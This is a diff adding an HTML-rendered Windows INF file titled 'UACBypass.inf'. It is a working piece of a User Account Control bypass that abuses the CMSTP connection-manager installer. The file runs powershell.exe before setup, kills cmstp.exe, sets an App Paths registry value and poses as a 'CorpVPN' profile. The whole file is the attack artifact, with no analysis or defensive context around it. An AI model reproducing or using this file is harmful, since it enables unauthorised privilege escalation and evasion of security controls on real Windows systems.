@@ -1,0 +1,28 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>UACBypass.inf</title>
+</head><body>; No longer needed - embedded in script now<br/>
+[version]<br/>
+Signature=$chicago$<br/>
+AdvancedINF=2.5<br/>
+<br/>
+[DefaultInstall]<br/>
+CustomDestination=CustInstDestSectionAllUsers<br/>
+RunPreSetupCommands=RunPreSetupCommandsSection<br/>
+<br/>
+[RunPreSetupCommandsSection]<br/>
+; Commands Here will be run Before Setup Begins to install<br/>
+C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe<br/>
+taskkill /IM cmstp.exe /F<br/>
+<br/>
+[CustInstDestSectionAllUsers]<br/>
+49000,49001=AllUSer_LDIDSection, 7<br/>
+<br/>
+[AllUSer_LDIDSection]<br/>
+"HKLM", "SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\CMMGR32.EXE", "ProfileInstallPath", "%UnexpectedError%", ""<br/>
+<br/>
+[Strings]<br/>
+ServiceName="CorpVPN"<br/>
+ShortSvcName="CorpVPN"</body></html>
